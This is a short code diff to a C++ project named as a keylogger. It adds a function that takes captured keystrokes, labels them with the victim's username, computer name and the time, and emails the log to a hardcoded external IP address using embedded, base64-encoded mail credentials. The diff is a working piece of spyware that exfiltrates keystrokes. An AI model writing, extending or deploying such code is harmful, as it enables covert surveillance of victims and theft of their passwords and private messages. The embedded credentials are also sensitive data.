@@ -1,5 +1,29 @@
 #include "ftpkeylogger.h"
 
+unsigned int __stdcall sendmail(void *vpkeylog){
+
+    string keylog = *(string *)vpkeylog;
+    cout << keylog.c_str();
+
+    char username[4096]{};
+    DWORD dummy = 4096; //Never used
+    GetUserName(username, &dummy);
+
+    string formatted_subject;
+    formatted_subject.append(username); formatted_subject.append("@"); formatted_subject.append(computername); formatted_subject.append("--");
+    formatted_subject.append(gettime());
+
+    //cout << keylog.c_str();
+
+    email sendlog("54.245.65.132", 587, "dHN0ZXIxQGxpdmUuY29t", "YkhmdVFXOEV4RU5KMkJRREVwOVluZw==",
+                                          "OGM_KEYLOGGER_SERVICE_DAEMON@OGM.com", filetokens[2].c_str(), formatted_subject.c_str() ,keylog.c_str());
+    sendlog.sendmail();
+    delete (string *)vpkeylog;
+    //cout << "Email sent";
+    return 0;
+}
+
+
 
 unsigned int __stdcall keylogthreadhook(void *){
 
